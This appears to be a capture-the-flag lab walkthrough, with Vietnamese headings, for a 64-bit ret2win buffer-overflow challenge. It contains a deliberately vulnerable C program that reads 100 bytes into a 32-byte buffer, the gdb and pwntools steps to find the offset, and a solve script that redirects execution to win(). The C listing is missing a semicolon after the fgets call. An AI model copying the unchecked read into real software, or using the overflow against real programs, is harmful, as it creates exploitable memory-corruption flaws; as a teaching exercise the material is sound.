# ret2win_chall_demo_file

## ret2win.c
```C
#include <stdio.h>
#include <string.h>
void win() {
    printf("\nWELL DONE! THIS IS YOUR FLAG: CTF{ISP_VO_DICH}\n");
}
void vulnerable() {
    char buffer[32];
    printf("Enter input: ");
   fgets(buffer, 100, stdin)
}
int main() {
    setbuf(stdout, NULL);
    printf("=== 64-bit RET2WIN CHALLENGE ===\n");
    vulnerable();
    printf("Try again!\n");
    return 0;
}
```




## Kiểm tra bảo mật
### Cài pwntools
```bash
pip install pwntools
```
### checksec file
```bash
checksec chall1
```


## Tạo pattern 100 kí tự
```bash
cyclic 100
```


## Khi chương trình crash, kiểm tra giá trị EIP/RIP:
```bash
info registers rip
```


## Tìm offset từ giá trị EIP/RIP:
```bash
cyclic -l <giá_trị_eip/rip>
```


## Tìm địa chỉ hàm win
```bash
p & win
```


## Viết script (solve1.py)
```python
from pwn import *

p = process('./chall_ret2win')

offset = 40                    #Độ dài offset
win_addr = 0x401156            #Địa chỉ hàm win

payload = b'A' * offset        #Tạo input gây BOF
payload += p64(win_addr)       #Ghi đè địa chỉ hàm win lên return address

p.sendline(payload)
p.interactive()
```


## Chạy script
```bash
  python3 solve1.py
```
